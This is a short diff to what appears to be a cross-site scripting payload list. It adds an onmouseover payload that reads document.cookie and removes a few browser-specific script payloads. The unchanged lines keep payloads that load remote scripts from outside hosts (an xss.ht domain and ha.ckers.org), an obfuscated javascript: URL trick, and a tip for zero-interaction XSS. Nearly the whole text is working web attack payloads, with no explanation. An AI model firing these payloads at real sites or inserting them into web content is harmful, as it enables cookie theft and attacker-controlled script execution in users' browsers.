@@ -4,6 +4,8 @@
 "><svg onload=alert(document.domain)>
 
 <svg><animate onend=alert(document.domain) attributeName=x dur=1s>
+  
+  <a onmouseover="alert(document.cookie)">xxs link</a>
 
   "><script src=https://assetcyber.xss.ht></script>
   
@@ -25,17 +27,6 @@
 (Append #bounty to the URL and enjoy your zero interaction XSS )
 
 <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
-
-# Internet Explorer, Edge
-<svg><script>alert(1)<p>
-
-# Firefox
-
-<svg><x><script>alert(1)</x>
-
-# Common
-
-'';!--"<XSS>=&{()}
 
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 
